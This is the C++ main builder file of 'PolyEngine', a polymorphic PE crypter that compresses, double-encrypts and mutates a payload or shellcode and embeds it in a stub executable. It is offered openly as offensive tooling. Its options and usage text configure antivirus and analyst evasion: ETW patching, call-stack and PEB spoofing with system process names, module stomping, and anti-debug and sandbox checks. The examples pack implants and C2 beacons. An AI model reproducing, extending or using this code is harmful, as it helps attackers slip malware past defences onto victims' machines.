/*
 * ==========================================================================
 *  Builder.cpp – Main entry point of the PolyEngine
 * ==========================================================================
 *
 *  This program creates polymorphic PE applications. It's just a packer.
 *  Steps:
 *  1. Reads input file (target payload PE).
 *  2. Compresses it with LZNT1 to minimize the footprint.
 *  3. Encrypts the data using a multi-stage byte-per-byte substitution.
 *  4. Generates a mutated, polymorphic decryptor stub in memory.
 *  5. Embeds the package into the .rsrc section of a blank Stub.exe 
 *     using Win32 Resource APIs (BeginUpdateResource/UpdateResource).
 *  =========================================================================
 */

#include <Windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <string.h>

/* Our modules */
#include "..\Engine\Crypto.h"
#include "..\Engine\Compression.h"
#include "..\Engine\PeBuilder.h"
#include "..\Engine\MutationEngine.h"
#include "..\Engine\Xtea.h"
#include "..\Engine\OpsecFlags.h"

#pragma comment(lib, "Crypt32.lib")

/* Fixed-seed Djb2 used to hash DLL export names — must match FIXED_DJB2_SEED in RunPE.c */
static DWORD BuilderDjb2A(const char* s) {
    DWORD h = 0xDEADC0DE;
    int   c;
    if (!s) return 0;
    while ((c = *s++)) h = ((h << 5) + h) + c;
    return h;
}

/* Pool of System32 process names used for PEB spoofing when --spoof-name is not specified. */
static const char* kSpoofPool[] = {
    "RuntimeBroker.exe",   /* UWP runtime broker — always running on modern Windows */
    "SgrmBroker.exe",      /* System Guard Runtime Monitor Broker                   */
    "WmiPrvSE.exe",        /* WMI Provider Host — very common background process    */
    "SearchIndexer.exe",   /* Windows Search Indexer                                */
    "taskhostw.exe",       /* Task Host Window — hosts background scheduled tasks   */
    "spoolsv.exe",         /* Print Spooler                                         */
    "wlrmdr.exe",          /* Windows Logon Reminder                                */
    "WMPDMC.exe",          /* Windows Media Player Device Manager Component         */
    "hvix64.exe",          /* Hyper-V Intel x64 Microkernel                        */
};
#define SPOOF_POOL_SIZE 9

/* ── --disable token lookup table ──────────────────────────────────────────
 *
 *  Maps each --disable identifier to the opsecFlags bitmask bit it sets.
 *  "all" is handled separately: it ORs every entry in this table plus
 *  EVASION_FLAG_NO_ALL (fast-exit shortcut in Evasion_RunChecks).
 *
 *  Tokens are matched case-insensitively.  Multiple tokens may appear in one
 *  --disable argument separated by commas (e.g. --disable etw,peb,cpu),
 *  and --disable may be repeated on the command line.
 * ------------------------------------------------------------------------- */
typedef struct { const char* name; DWORD flag; } DISABLE_ENTRY;
static const DISABLE_ENTRY kDisableMap[] = {
    /* OPSEC technique disable */
    { "etw",       OPSEC_FLAG_NO_ETW          },  /* skip EtwEventWrite patch     */
    { "spoofing",  OPSEC_FLAG_NO_CALLSTACK    },  /* skip VEH/HWBP call-stack spoof */
    { "peb",       OPSEC_FLAG_NO_PEB          },  /* skip PEB path/cmdline spoof  */
    { "tls",       OPSEC_FLAG_NO_TLS          },  /* skip TLS anti-debug callback */
    /* Evasion check disable */
    { "hammer",    EVASION_FLAG_NO_HAMMER      },  /* skip VirtualAlloc/Free delay */
    { "debugger",  EVASION_FLAG_NO_DEBUGGER    },  /* skip PEB / NtQIP debug check */
    { "api-emu",   EVASION_FLAG_NO_API_EMU     },  /* skip RtlComputeCrc32 probe   */
    { "exec-ctrl", EVASION_FLAG_NO_EXEC_CTRL   },  /* skip "wuauctl" semaphore to run more than 1 session at once */
    { "sleep-fwd", EVASION_FLAG_NO_SLEEP_FWD   },  /* skip sleep-forwarding timing */
    { "uptime",    EVASION_FLAG_NO_UPTIME       },  /* skip < 2 min uptime check */
    { "cpu",       EVASION_FLAG_NO_CPU_COUNT    },  /* skip < 2 CPU check if its troublesome */
    { "screen",    EVASION_FLAG_NO_SCREEN_RES   },  /* skip screen resolution check */
    { "files",     EVASION_FLAG_NO_RECENT_FILES },  /* skip recent-files key check  */
    { NULL, 0 }
};

/* Parses a comma-separated list of disable tokens and ORs the corresponding
 * flags into *pFlags.  "all" disables every entry plus EVASION_FLAG_NO_ALL.
 * Returns FALSE and prints an error if an unknown token is encountered. */
static BOOL ApplyDisableList(const char* list, DWORD* pFlags) {
    char buf[256];
    strncpy_s(buf, sizeof(buf), list, _TRUNCATE);
    char* ctx = NULL;
    char* tok = strtok_s(buf, ",", &ctx);
    while (tok) {
        while (*tok == ' ') tok++;  /* trim leading spaces */

        if (_stricmp(tok, "all") == 0) {
            for (int k = 0; kDisableMap[k].name; k++)
                *pFlags |= kDisableMap[k].flag;
            *pFlags |= EVASION_FLAG_NO_ALL;
        } else {
            BOOL found = FALSE;
            for (int k = 0; kDisableMap[k].name; k++) {
                if (_stricmp(tok, kDisableMap[k].name) == 0) {
                    *pFlags |= kDisableMap[k].flag;
                    found = TRUE;
                    break;
                }
            }
            if (!found) {
                printf("[!] Unknown --disable token: \"%s\"\n"
                       "    Valid tokens: etw spoofing peb tls hammer debugger\n"
                       "                  api-emu exec-ctrl sleep-fwd uptime cpu\n"
                       "                  screen files all\n", tok);
                return FALSE;
            }
        }
        tok = strtok_s(NULL, ",", &ctx);
    }
    return TRUE;
}

/* -------------------------------------------------------------------------
 *  ParseArgs — minimal CLI argument parser
 *  Returns FALSE on bad/missing arguments; caller prints usage.
 * ------------------------------------------------------------------------- */
static BOOL ParseArgs(int argc, char* argv[],
                      const char** ppTargetPath,
                      const char** ppOutputPath,
                      const char** ppStubPath,
                      BYTE         dll_indices[3],
                      DWORD*       pExportHash,
                      char         exportArgBuf[128],
                      char         spoofExeBuf[64],
                      char         semaphoreNameBuf[32],
                      DWORD*       pSleepFwdMs,
                      DWORD*       pUptimeMin,
                      DWORD*       pHammerMs,
                      DWORD*       pOpsecFlags)
{
    if (argc < 3) return FALSE;

    *ppTargetPath = argv[1];
    *ppOutputPath = argv[2];
    *ppStubPath   = "stub.bin";
    *pExportHash  = 0;
    *pSleepFwdMs  = 0;   /* 0 = use default 500 ms  */
    *pUptimeMin   = 0;   /* 0 = use default 2 min   */
    *pHammerMs    = 0;   /* 0 = use default 3000 ms */
    *pOpsecFlags  = 0;
    exportArgBuf[0]     = '\0';
    spoofExeBuf[0]      = '\0';  /* empty = will be filled with random pool entry after parsing */
    semaphoreNameBuf[0] = '\0';  /* empty = use default "wuauctl" at runtime */

    /* Default preset: PRINT (indices 0, 1, 2) */
    dll_indices[0] = 0;
    dll_indices[1] = 1;
    dll_indices[2] = 2;

    for (int i = 3; i < argc; i++) {
        if (_stricmp(argv[i], "--stub") == 0 && i + 1 < argc) {
            *ppStubPath = argv[++i];
        }
        else if (_stricmp(argv[i], "--preset") == 0 && i + 1 < argc) {
            const char* preset = argv[++i];
            if (_stricmp(preset, "PRINT") == 0) {
                dll_indices[0] = 0; dll_indices[1] = 1; dll_indices[2] = 2;
            } else if (_stricmp(preset, "MEDIA") == 0) {
                dll_indices[0] = 3; dll_indices[1] = 4; dll_indices[2] = 5;
            } else if (_stricmp(preset, "NETWORK") == 0) {
                dll_indices[0] = 6; dll_indices[1] = 7; dll_indices[2] = 8;
            } else if (_stricmp(preset, "RANDOM") == 0) {
                /* CryptGenRandom fills a byte for each index, then mod 10 */
                HCRYPTPROV hProv = 0;
                BYTE rnd[3] = { 0 };
                if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
                    CryptGenRandom(hProv, 3, rnd);
                    CryptReleaseContext(hProv, 0);
                }
                dll_indices[0] = rnd[0] % 10;
                dll_indices[1] = rnd[1] % 10;
                dll_indices[2] = rnd[2] % 10;
            } else {
                printf("[!] Unknown preset: %s  (valid: PRINT, MEDIA, NETWORK, RANDOM)\n", preset);
                return FALSE;
            }
        }
        else if (_stricmp(argv[i], "--export") == 0 && i + 1 < argc) {
            *pExportHash = BuilderDjb2A(argv[++i]);
        }
        else if (_stricmp(argv[i], "--arg") == 0 && i + 1 < argc) {
            const char* arg = argv[++i];
            strncpy_s(exportArgBuf, 128, arg, 127);
            exportArgBuf[127] = '\0';
        }
        else if (_stricmp(argv[i], "--spoof-name") == 0 && i + 1 < argc) {
            const char* name = argv[++i];
            strncpy_s(spoofExeBuf, 64, name, 63);
            spoofExeBuf[63] = '\0';
        }
        else if (_stricmp(argv[i], "--exec-ctrl-name") == 0 && i + 1 < argc) {
            const char* name = argv[++i];
            strncpy_s(semaphoreNameBuf, 32, name, 31);
            semaphoreNameBuf[31] = '\0';
        }
        else if (_stricmp(argv[i], "--sleep-fwd-ms") == 0 && i + 1 < argc) {
            int v = atoi(argv[++i]);
            *pSleepFwdMs = (v > 0) ? (DWORD)v : 0;
        }
        else if (_stricmp(argv[i], "--uptime-min") == 0 && i + 1 < argc) {
            int v = atoi(argv[++i]);
            *pUptimeMin = (v > 0) ? (DWORD)v : 0;
        }
        else if (_stricmp(argv[i], "--hammer-s") == 0 && i + 1 < argc) {
            int v = atoi(argv[++i]);
            *pHammerMs = (v > 0) ? (DWORD)(v * 1000) : 0;
        }
        else if (_stricmp(argv[i], "--overload") == 0) {
            *pOpsecFlags |= OPSEC_FLAG_MODULE_OVERLOAD;
        }
        else if (_stricmp(argv[i], "--keep-alive") == 0) {
            *pOpsecFlags |= OPSEC_FLAG_KEEP_ALIVE;
        }
        else if (_stricmp(argv[i], "--disable") == 0 && i + 1 < argc) {
            if (!ApplyDisableList(argv[++i], pOpsecFlags)) return FALSE;
        }
        else {
            printf("[!] Unknown option: %s\n", argv[i]);
            return FALSE;
        }
    }
    return TRUE;
}

int main(int argc, char* argv[]) {
  printf("=============================================\n");
  printf("# PolyEngine - Polymorphic Mutation Engine # \n");
  printf("#                PE Crypter                # \n");
  printf("#                                  By Razz # \n");
  printf("=============================================\n\n");

  const char* targetPath = NULL;
  const char* stubPath   = NULL;
  const char* outputPath = NULL;
  BYTE        dll_indices[3]        = { 0 };
  DWORD       exportHash            = 0;
  char        exportArgBuf[128]     = { 0 };
  char        spoofExeBuf[64]       = { 0 };
  char        semaphoreNameBuf[32]  = { 0 };
  DWORD       sleepFwdMs            = 0;
  DWORD       uptimeMin             = 0;
  DWORD       hammerMs              = 0;
  DWORD       opsecFlags            = 0;

  if (!ParseArgs(argc, argv, &targetPath, &outputPath, &stubPath, dll_indices,
                 &exportHash, exportArgBuf, spoofExeBuf,
                 semaphoreNameBuf, &sleepFwdMs, &uptimeMin, &hammerMs,
                 &opsecFlags)) {
      printf("Usage: Builder.exe <input> <output> [OPTIONS]\n");
      printf("\n");
      printf("  <input>   Target PE (.exe/.dll) or raw shellcode (.bin)\n");
      printf("            Auto-detected from MZ header\n");
      printf("  <output>  Output executable\n");
      printf("\n");
      printf("Loader:\n");
      printf("  --stub <path>              Path to stub.bin  [default: ./stub.bin]\n");
      printf("  --preset PRINT|MEDIA|NETWORK|RANDOM\n");
      printf("                             Module stomping DLL preset  [default: PRINT]\n");
      printf("  --overload                 Module overloading instead of stomping\n");
      printf("                             (NtCreateSection/NtMapViewOfSection, not in PEB LDR)\n");
      printf("  --keep-alive               ExitThread(0) instead of ExitProcess\n");
      printf("                             (required for C2 implants that spawn their own threads)\n");
      printf("\n");
      printf("Payload  (PE/DLL only, silently ignored for shellcode):\n");
      printf("  --export <name>            DLL export to invoke after DllMain\n");
      printf("  --arg <string>             Argument passed to the export  [max 127 chars]\n");
      printf("\n");
      printf("Evasion customization (all ON by default):\n");
      printf("  --spoof-name <exe>         Process name for PEB spoof  [default: random from pool]\n");
      printf("                             Pool: RuntimeBroker.exe SgrmBroker.exe WmiPrvSE.exe\n");
      printf("                                   SearchIndexer.exe taskhostw.exe spoolsv.exe\n");
      printf("                                   wlrmdr.exe WMPDMC.exe hvix64.exe\n");
      printf("  --exec-ctrl-name <name>    Semaphore name for exec-ctrl check  [default: wuauctl]\n");
      printf("                             (max 31 chars)\n");
      printf("  --sleep-fwd-ms <ms>        Sleep duration for sleep-fwd check  [default: 500]\n");
      printf("                             Detection threshold: 90%% of <ms> elapsed\n");
      printf("  --uptime-min <minutes>     Uptime threshold for uptime check  [default: 2]\n");
      printf("  --hammer-s <seconds>       API-hammer delay duration  [default: 3]\n");
      printf("  --disable <token[,token]>  Disable one or more features (comma-separated, repeatable)\n");
      printf("\n");
      printf("  OPSEC tokens:\n");
      printf("    etw         EtwEventWrite patch (ETW telemetry)\n");
      printf("    spoofing    Call-stack spoofing (VEH/HWBP)\n");
      printf("    peb         PEB path/cmdline spoof\n");
      printf("    tls         TLS anti-debug callback\n");
      printf("\n");
      printf("  Sandbox/debug check tokens:\n");
      printf("    hammer      API-hammer timing delay (VirtualAlloc/Free loop)\n");
      printf("    debugger    Debugger detection (PEB flags / NtQueryInformationProcess)\n");
      printf("    api-emu     API emulation probe (RtlComputeCrc32 identity check)\n");
      printf("    exec-ctrl   Execution-control semaphore (re-execution detection)\n");
      printf("    sleep-fwd   Sleep-forwarding detection (timing)\n");
      printf("    uptime      System uptime check\n");
      printf("    cpu         CPU count check (< 2 logical cores)\n");
      printf("    screen      Screen resolution check (<= 1024 px width)\n");
      printf("    files       Recent-files count check (< 5 RecentDocs subkeys)\n");
      printf("    all         Disable every token listed above\n");
      printf("\n");
      printf("Examples:\n");
      printf("  Builder.exe implant.exe     packed.exe\n");
      printf("  Builder.exe shellcode.bin   packed.exe --keep-alive\n");
      printf("  Builder.exe beacon.dll      packed.exe --export Start --keep-alive\n");
      printf("  Builder.exe payload.dll     packed.exe --export Execute --arg \"calc.exe\"\n");
      printf("  Builder.exe implant.exe     packed.exe --preset NETWORK --disable etw,tls\n");
      return 1;
  }

  /* If --spoof-name was not provided, pick a random entry from the pool. */
  if (spoofExeBuf[0] == '\0') {
      HCRYPTPROV hProv = 0;
      BYTE rndByte = 0;
      if (CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT)) {
          CryptGenRandom(hProv, 1, &rndByte);
          CryptReleaseContext(hProv, 0);
      }
      const char* picked = kSpoofPool[rndByte % SPOOF_POOL_SIZE];
      strncpy_s(spoofExeBuf, 64, picked, 63);
      printf("[*] PEB spoof process: %s (random)\n", spoofExeBuf);
  } else {
      printf("[*] PEB spoof process: %s (user-specified)\n", spoofExeBuf);
  }

  /* STEP 1: Initialization API */
  printf("[*] Phase 1: NTAPI & Compression Initialization...\n");
  if (!InitCompressionApi()) {
    fprintf(stderr, "[!] ERROR: Couldn't initialize Compression APIs.\n");
    return 1;
  }

  /* STEP 2: Generating Key for Payload */
  printf("[*] Phase 2: Compound Cipher Key Generation...\n");
  COMPOUND_KEY cipherKey;
  GenerateCompoundKey(&cipherKey);
  printf("[+] Key: key1=0x%02X rotBits=%d key3=0x%02X key4=0x%02X\n",
         cipherKey.key1, cipherKey.rotBits, cipherKey.key3, cipherKey.key4);

  /* STEP 3: Reading Target payload (PE or raw shellcode) */
  printf("[*] Phase 3: Reading target payload: %s\n", targetPath);
  BYTE* rawTargetBuffer = NULL;
  DWORD rawTargetSize = 0;
  if (!ReadFileToBuffer(targetPath, &rawTargetBuffer, &rawTargetSize)) {
      fprintf(stderr, "[!] ERROR: Failed to read target file.\n");
      return 1;
  }
  printf("[+] Target file loaded (%lu bytes)\n", rawTargetSize);

  /* Auto-detect: if first two bytes are not "MZ" treat as raw PIC shellcode.
   * The entire pipeline (compress → inner-encrypt → mutate → XTEA → .rsrc)
   * is identical for both formats — only the Stub execution path differs. */
  if (rawTargetSize >= 2 &&
      !(rawTargetBuffer[0] == 'M' && rawTargetBuffer[1] == 'Z')) {
      opsecFlags |= PAYLOAD_FLAG_IS_SHELLCODE;
      printf("[*] Payload type: raw shellcode (no MZ header) - stub will execute directly\n");
      /* --export / --arg are meaningless for shellcode; clear silently */
      exportHash      = 0;
      exportArgBuf[0] = '\0';
  } else {
      printf("[*] Payload type: PE (MZ detected) - stub will use RunPE\n");
  }

  /* STEP 4: Compressing Target PE (LZNT1) */
  printf("[*] Phase 4: Compressing Target PE (LZNT1)...\n");
  BYTE* compressedBuffer = NULL;
  ULONG compressedSize = 0;
  if (!CompressPayload(rawTargetBuffer, rawTargetSize, &compressedBuffer, &compressedSize)) {
      fprintf(stderr, "[!] ERROR: Failed to compress payload.\n");
      SecureZeroMemory(rawTargetBuffer, rawTargetSize);
      HeapFree(GetProcessHeap(), 0, rawTargetBuffer);
      return 1;
  }
  printf("[+] Payload compressed: %lu -> %lu bytes\n", rawTargetSize, compressedSize);

  /* Zero and free the raw PE — the plaintext payload is no longer needed */
  SecureZeroMemory(rawTargetBuffer, rawTargetSize);
  HeapFree(GetProcessHeap(), 0, rawTargetBuffer);
  rawTargetBuffer = NULL;

  /* STEP 5: Encrypting payload */
  printf("[*] Phase 5: Encrypting payload...\n");
  CompoundEncrypt(compressedBuffer, compressedSize, &cipherKey);
  printf("[+] Payload encrypted successfully!\n");

  /* STEP 6: Decryptor Mutation — cipherKey must still be valid here so
   * MutateDecryptor can embed the correct decryption key into the stub.
   * Zero it only after mutation completes. */
  printf("[*] Phase 6: Decryptor Mutation...\n");
  MUTATED_SHELLCODE mutated = {0};
  if (!MutateDecryptor(compressedBuffer, compressedSize, &cipherKey, &mutated)) {
    fprintf(stderr, "[!] ERROR: MutateDecryptor failed\n");
    SecureZeroMemory(&cipherKey, sizeof(cipherKey));
    HeapFree(GetProcessHeap(), 0, compressedBuffer);
    return 1;
  }
  printf("[+] Mutation completed! Stub size: %zu bytes (Total: %zu)\n", mutated.stubSize, mutated.totalSize);

  /* Zero cipher key — key is now embedded in the mutated stub; no longer needed */
  SecureZeroMemory(&cipherKey, sizeof(cipherKey));

  /* STEP 7: Per-build XTEA key salt + outer encryption
   *
   * CryptGenRandom produces 16 random bytes (= 4 DWORDs) that are:
   *   1. XOR'd into the stack-constructed base key  →  unique XTEA key per build
   *   2. Stored plaintext in the .rsrc metadata block  →  Stub reads and applies them
   *
   * Without the salt every build would share the same XTEA key (stack construction
   * uses only fixed mathematical constants).  With the salt, an analyst must break
   * the key independently for each packed file. */
  printf("[*] Phase 7: Generating per-build XTEA key salt (CryptGenRandom)...\n");
  DWORD key_salt[4] = { 0 };
  {
      HCRYPTPROV hProv = 0;
      if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT) ||
          !CryptGenRandom(hProv, sizeof(key_salt), (BYTE*)key_salt)) {
          fprintf(stderr, "[!] ERROR: CryptGenRandom failed for XTEA salt.\n");
          HeapFree(GetProcessHeap(), 0, mutated.pBuffer);
          HeapFree(GetProcessHeap(), 0, compressedBuffer);
          return 1;
      }
      CryptReleaseContext(hProv, 0);
  }

  printf("[*] Phase 7b: XTEA outer encryption...\n");
  DWORD xteaKey[4];
  Xtea_DeriveKey(xteaKey, key_salt);
  Xtea_Crypt(mutated.pBuffer, mutated.totalSize, xteaKey);
  printf("[+] XTEA done - key: %08X %08X %08X %08X  salt: %08X %08X %08X %08X\n",
         xteaKey[0], xteaKey[1], xteaKey[2], xteaKey[3],
         key_salt[0], key_salt[1], key_salt[2], key_salt[3]);

  /* Zero XTEA key from stack — key_salt is still needed for BuildInfectedPE */
  SecureZeroMemory(xteaKey, sizeof(xteaKey));

  /* STEP 7c: Verify that at least one preset DLL has an executable section
   *           large enough to hold the final payload blob.
   *
   * This is a Builder-side sanity check only — Stub handles the failure
   * gracefully (tries the next DLL, returns NULL if all fail).  But the user
   * deserves a warning *before* shipping an exe that will silently crash.
   *
   * Implementation:
   *   - Mirror the same 10-DLL pool used by ModuleStomping.c.
   *   - For each of the 3 preset indices: LoadLibraryExA (DONT_RESOLVE_DLL_REFERENCES
   *     so we get a flat mapping with no side effects), walk PE sections, find the
   *     largest IMAGE_SCN_MEM_EXECUTE section, compare VirtualSize to totalSize.
   *   - FreeLibrary immediately after inspection.
   *   - If none of the three DLLs is large enough: print a prominent warning and
   *     suggest --preset RANDOM or a different preset. */
  {
      static const char* kDllPool[10] = {
          "xpsservices.dll",  /* 0 — PRINT   */
          "msi.dll",          /* 1 — PRINT   */
          "dbghelp.dll",      /* 2 — PRINT   */
          "winmm.dll",        /* 3 — MEDIA   */
          "dxgi.dll",         /* 4 — MEDIA   */
          "oleaut32.dll",     /* 5 — MEDIA   */
          "winhttp.dll",      /* 6 — NETWORK */
          "wtsapi32.dll",     /* 7 — NETWORK */
          "wlanapi.dll",      /* 8 — NETWORK */
          "bcrypt.dll",       /* 9 — CRYPTO  */
      };

      printf("[*] Phase 7c: Verifying preset DLL section sizes...\n");

      int anyFit = 0;
      for (int i = 0; i < 3; i++) {
          BYTE idx = dll_indices[i];
          if (idx >= 10) continue;

          const char* dllName = kDllPool[idx];
          /* DONT_RESOLVE_DLL_REFERENCES: flat file mapping, no DllMain, no imports */
          HMODULE hMod = LoadLibraryExA(dllName, NULL, DONT_RESOLVE_DLL_REFERENCES);
          if (!hMod) {
              printf("    [!] DLL[%d] %s: not found on this system (skipped)\n", idx, dllName);
              continue;
          }

          PBYTE pBase = (PBYTE)hMod;
          PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pBase;
          DWORD maxExecSize = 0;

          if (pDos->e_magic == IMAGE_DOS_SIGNATURE) {
              PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pBase + pDos->e_lfanew);
              if (pNt->Signature == IMAGE_NT_SIGNATURE) {
                  PIMAGE_SECTION_HEADER pSec = IMAGE_FIRST_SECTION(pNt);
                  WORD nSec = pNt->FileHeader.NumberOfSections;
                  for (WORD s = 0; s < nSec; s++) {
                      if (pSec[s].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                          if (pSec[s].Misc.VirtualSize > maxExecSize)
                              maxExecSize = pSec[s].Misc.VirtualSize;
                      }
                  }
              }
          }

          FreeLibrary(hMod);

          if (maxExecSize >= (DWORD)mutated.totalSize) {
              printf("    [+] DLL[%d] %-20s .text=%lu bytes  >= payload %zu bytes  OK\n",
                     idx, dllName, maxExecSize, mutated.totalSize);
              anyFit = 1;
          } else {
              printf("    [-] DLL[%d] %-20s .text=%lu bytes  <  payload %zu bytes  TOO SMALL\n",
                     idx, dllName, maxExecSize, mutated.totalSize);
          }
      }

      if (!anyFit) {
          fprintf(stderr,
              "\n[!] WARNING: None of the preset DLLs has an executable section large\n"
              "             enough for the payload (%zu bytes).\n"
              "             The packed exe will fail at runtime (exit code 33).\n"
              "             Try a different preset:  --preset MEDIA / NETWORK / RANDOM\n\n",
              mutated.totalSize);
		  /* Warning only — we still proceed with the build, Stub will handle the failure gracefully. */
      }
  }

  /* STEP 8: Building Final PE */
  printf("[*] Phase 8: Building Final PE...\n");
  printf("[*] Module-stomp preset: DLL pool indices [%u, %u, %u]\n",
         dll_indices[0], dll_indices[1], dll_indices[2]);
  if (BuildInfectedPE(stubPath, outputPath,
                      mutated.pBuffer, mutated.totalSize,
                      rawTargetSize, (DWORD)mutated.stubSize,
                      key_salt, dll_indices,
                      exportHash, exportArgBuf,
                      spoofExeBuf,
                      semaphoreNameBuf[0] ? semaphoreNameBuf : NULL,
                      sleepFwdMs,
                      uptimeMin,
                      hammerMs,
                      opsecFlags)) {
      printf("\n[+] === You're good to go! Build finished. ===\n");
      printf("[+] Saved as: %s\n", outputPath);
  } else {
      fprintf(stderr, "\n[!] === Build failed. ===\n");
  }

  /* Zero key_salt after BuildInfectedPE — it has been embedded in .rsrc */
  SecureZeroMemory(key_salt, sizeof(key_salt));

  /* Cleanup — zero sensitive buffers before freeing */
  if (mutated.pBuffer) {
      SecureZeroMemory(mutated.pBuffer, mutated.totalSize);
      HeapFree(GetProcessHeap(), 0, mutated.pBuffer);
  }
  if (compressedBuffer) {
      SecureZeroMemory(compressedBuffer, compressedSize);
      HeapFree(GetProcessHeap(), 0, compressedBuffer);
  }

  return 0;
}
